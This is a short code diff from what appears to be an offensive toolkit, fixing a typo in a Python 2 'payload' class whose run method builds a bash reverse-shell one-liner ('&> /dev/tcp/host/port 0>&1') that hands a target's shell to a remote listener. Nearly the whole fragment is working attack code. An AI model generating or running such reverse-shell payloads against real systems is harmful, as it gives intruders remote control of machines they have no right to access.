@@ -27,7 +27,7 @@ class payload:
 
 	def run(self,server):
 		shell = raw_input(h.info_general_raw("Target Shell: "))
-		payload = shell+" &> /dev/tcp/"+server.host_"/"+str(server.port)+" 0>&1"
+		payload = shell+" &> /dev/tcp/"+server.host+"/"+str(server.port)+" 0>&1"
 		backend = len(payload)
 		print h.WHITE + "-"*backend + h.ENDC
 		print h.COLOR_INFO+payload+h.ENDC
